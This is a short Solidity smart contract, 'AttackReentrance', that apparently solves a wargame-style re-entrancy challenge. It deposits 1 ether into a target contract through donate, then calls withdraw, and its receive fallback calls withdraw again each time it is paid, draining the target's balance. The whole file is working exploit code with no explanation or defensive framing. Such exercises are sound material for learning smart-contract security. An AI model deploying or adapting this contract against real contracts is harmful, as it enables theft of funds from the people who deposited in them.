// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackReentrance {
    address payable target;
    address payable public owner;
    uint256 amount = 1 ether;

    constructor(address payable _target) public payable {
        target = _target;
        owner = msg.sender;
    }

    function donate() public payable {
        (bool success, ) = target.call.value(amount)(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success, "donate fail");
    }

    function attack() public payable {
        (bool success, ) = target.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(success, "attack fail");
    }

    receive() external payable {
        (bool success, ) = target.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(success, "receive error");
    }
}
